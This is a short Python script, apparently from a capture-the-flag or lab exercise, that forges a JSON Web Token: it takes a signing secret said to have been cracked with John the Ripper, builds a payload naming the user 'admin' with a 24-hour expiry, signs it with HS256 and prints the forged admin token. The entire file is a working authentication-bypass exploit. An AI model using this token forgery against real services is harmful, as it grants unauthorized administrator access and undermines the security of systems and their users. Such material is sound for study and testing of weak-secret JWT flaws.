import jwt
import datetime

# The secret found by John the Ripper
SECRET = "naruto"

# Crafting the admin payload
payload = {
    "user": "admin",
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(hours=24)).timestamp())
}

# Sign it with the cracked secret
forged_token = jwt.encode(payload, SECRET, algorithm="HS256")

print("\n" + "="*50)
print("FORGED ADMIN TOKEN")
print("="*50)
print(forged_token)
print("="*50 + "\n")
